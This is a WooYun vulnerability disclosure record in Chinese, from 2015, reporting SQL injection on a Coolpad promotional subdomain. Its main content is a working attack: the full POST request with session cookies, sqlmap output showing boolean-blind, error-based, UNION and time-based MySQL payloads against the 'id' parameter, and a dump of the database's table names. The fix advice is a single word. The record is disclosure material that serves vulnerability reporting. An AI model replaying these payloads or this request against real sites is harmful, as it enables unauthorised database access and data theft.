{"id": 18545, "wybug_id": "wooyun-2015-0116069", "wybug_title": "酷派又一业务存在sql注入", "wybug_corp": "yulong.com", "wybug_author": "路人甲", "wybug_date": "2015-05-25 14:23", "wybug_open_date": "2015-07-12 10:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-12：\t细节向公众公开  简要描述： 12 详细说明：  12   漏洞证明：  http://5950.coolpad.cn/ 分站地址post数据：\nPOST /interface.php?c=users51&m=clickFiveAddOne HTTP/1.0Host: 5950.coolpad.cnProxy-Connection: keep-aliveContent-Length: 5Origin: http://5950.coolpad.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36content-type: application/x-www-form-urlencodedAccept: */*Referer: http://5950.coolpad.cn/swf2/coolpadindex.swfAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: __utmaxx233=238988767.846963834.1432533975.1432533975.1432533975.1; __utmcxx233=238988767; __utmz=238988767.1432533975.1.1.utmccn=(referral)|utmcsr=mcsdl.yulong.com|utmcct=/index/index.html|utmcmd=referral; __scnt=1; PHPSESSID=2ph1sbc53npacfss50s5ackli4; __utmbxx233=238988767; _jzqa=1.3850769915902337500.1432534282.1432534282.1432534282.1; _jzqc=1; _jzqx=1.1432534282.1432534282.1.jzqsr=5950%2Ecoolpad%2Ecn|jzqct=/swf2/coolpadindex%2Eswf.-; _jzqckmp=1; _jzqb=1.1.10.1432534282.0id=11注入参数：sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: id (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=11 AND 6429=6429    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: id=11 AND (SELECT 7365 FROM(SELECT COUNT(*),CONCAT(0x71706b6a71,(SELECT (CASE WHEN (7365=7365) THEN 1 ELSE 0 END)),0x716a707a71,FLOOR(RAND(0)*2))xFROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: UNION query    Title: MySQL UNION query (NULL) - 10 columns    Payload: id=-6987 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71706b6a71,0x6871696c4f68754a6644,0x716a707a71),NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=11 AND SLEEP(5)---[14:16:38] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, PHP 5.4.15back-end DBMS: MySQL 5.0[14:16:38] [INFO] testing if current user is DBA[14:16:38] [INFO] fetching current user\n\n\n跑个表：\nDatabase: 5950coolpad[13 tables]+----------------------+| add_click_good_count || add_user_count       || click_find_king      || click_five_add_one   || click_good           || click_good_one       || find_king            || five_add_one         || five_add_one_code    || game                 || game_result          || login_log            || sendinfo_log         |+----------------------+\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-05-28 10:15 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}